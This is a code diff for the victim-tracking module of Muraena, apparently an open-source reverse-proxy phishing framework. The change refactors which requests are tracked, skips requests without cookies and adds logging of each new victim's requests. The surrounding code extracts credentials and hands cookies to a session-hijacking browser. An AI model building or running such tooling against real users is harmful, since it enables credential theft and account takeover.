@@ -13,6 +13,7 @@ import (
 	"time"
 
 	"github.com/manifoldco/promptui"
+
 	"github.com/muraenateam/muraena/module/telegram"
 
 	"github.com/muraenateam/muraena/core"
@@ -35,6 +36,14 @@ const (
 	// Author of this module
 	Author = "Muraena Team"
 )
+
+const (
+	blockExtension = "JS,CSS,MAP,WOFF,SVG,SVC,JSON,GIF,ICO"
+	blockMedia     = "image/*,audio/*,video/*,font/*,application/*"
+)
+
+var DisabledExtensions = strings.Split(strings.ToLower(blockExtension), ",")
+var DisabledMedia = strings.Split(strings.ToLower(blockMedia), ",")
 
 // Tracker module
 type Tracker struct {
@@ -174,17 +183,20 @@ func isDisabledMethod(method string) bool {
 	return false
 }
 
-func isDisabledAccessMediaType(accessMedia string) bool {
+func isDisabledMediaType(media string, disabledMedia []string) bool {
 
-	var disabledMedia = []string{"image/"}
+	media = strings.TrimSpace(strings.ToLower(media))
+	if media == "" {
+		return false
+	}
 
 	// Media Type handling.
-	// Prevent processing of unwanted accessMedia types
-	accessMedia = strings.TrimSpace(strings.ToLower(accessMedia))
+	// Prevent processing of unwanted media types
+	media = strings.TrimSpace(strings.ToLower(media))
 	for _, skip := range disabledMedia {
 
-		skip = strings.ToLower(skip)
-		if strings.HasPrefix(accessMedia, skip) {
+		skip = strings.Split(skip, "*")[0]
+		if strings.HasPrefix(media, skip) {
 			return true
 		}
 	}
@@ -194,12 +206,21 @@ func isDisabledAccessMediaType(accessMedia string) bool {
 
 func isDisabledPath(requestPath string) bool {
 
+	requestPath = strings.ToLower(requestPath)
+	requestPath = strings.Split(requestPath, "?")[0]
+	if requestPath == "" {
+		return true
+	}
+
+	if strings.HasSuffix(requestPath, "/") {
+		return true
+	}
+
 	file := path.Base(requestPath)
-	ext := strings.ToUpper(filepath.Ext(file))
+	ext := filepath.Ext(file)
 	ext = strings.ReplaceAll(ext, ".", "")
 
-	var disabledExtensions = []string{"JS", "CSS", "MAP", "WOFF", "SVG"}
-	for _, disabled := range disabledExtensions {
+	for _, disabled := range DisabledExtensions {
 		if ext == disabled {
 			return true
 		}
@@ -239,20 +260,18 @@ func (module *Tracker) TrackRequest(request *http.Request) (t *Trace) {
 	// Requests to skip
 	//
 	if isDisabledMethod(request.Method) {
-		module.Debug("Skipping request method [%s] because untrackable ... for now ",
-			tui.Bold(tui.Red(request.Method)))
 		return
 	}
 
 	if isDisabledPath(request.URL.Path) {
-		module.Debug("Skipping requested path [%s] because untrackable ... for now ",
-			tui.Bold(tui.Red(request.URL.Path)))
 		return
 	}
 
-	if isDisabledAccessMediaType(request.Header.Get("Access")) {
-		module.Debug("Skipping requested Access header [%s] because untrackable ... for now ",
-			tui.Bold(tui.Red(request.Header.Get("Access"))))
+	if isDisabledMediaType(request.Header.Get("Access"), DisabledMedia) {
+		return
+	}
+
+	if isDisabledMediaType(request.Header.Get("Content-Type"), DisabledMedia) {
 		return
 	}
 
@@ -305,6 +324,12 @@ func (module *Tracker) TrackRequest(request *http.Request) (t *Trace) {
 	}
 
 	if noTraces {
+
+		// if the Cookie HTTP Header is not set, skip
+		if request.Header.Get("Cookie") == "" {
+			return
+		}
+
 		t.ID = module.makeID()
 	}
 
@@ -340,6 +365,7 @@ func (module *Tracker) TrackRequest(request *http.Request) (t *Trace) {
 
 		module.PushVictim(v)
 		module.Info("New victim [%s] IP[%s] UA[%s]", tui.Bold(tui.Red(t.ID)), IPSource, request.UserAgent())
+		module.Info("[%s] %s://%s%s", request.Method, request.URL.Scheme, request.Host, request.URL.Path)
 	}
 
 	v.RequestCount++
@@ -392,7 +418,7 @@ func (module *Tracker) TrackResponse(response *http.Response) (victim *db.Victim
 	}
 
 	if !trackingFound {
-		module.Debug("Untracked response: [%s] %s", response.Request.Method, response.Request.URL)
+		module.Verbose("Untracked response: [%s] %s", response.Request.Method, response.Request.URL)
 		// Reset trace
 		t = module.makeTrace("")
 
@@ -422,8 +448,7 @@ func (t *Trace) ExtractCredentials(body string, request *http.Request) (found bo
 	for _, c := range t.Session.Config.Tracking.Urls.Credentials {
 		if request.URL.Path == c {
 
-			t.Debug("[%s] there might be credentials here.")
-
+			t.Verbose("[%s] there might be credentials here.")
 			for _, p := range t.Session.Config.Tracking.Patterns {
 
 				// Case *sensitive* matching
@@ -472,7 +497,7 @@ func (t *Trace) ExtractCredentials(body string, request *http.Request) (found bo
 	return found, nil
 }
 
-// HijackSession: If the request URL matches those defined in authSession in the config, then
+// HijackSession If the request URL matches those defined in authSession in the config, then
 // pass the cookies in the CookieJar to necrobrowser to hijack the session
 func (t *Trace) HijackSession(request *http.Request) (err error) {
 
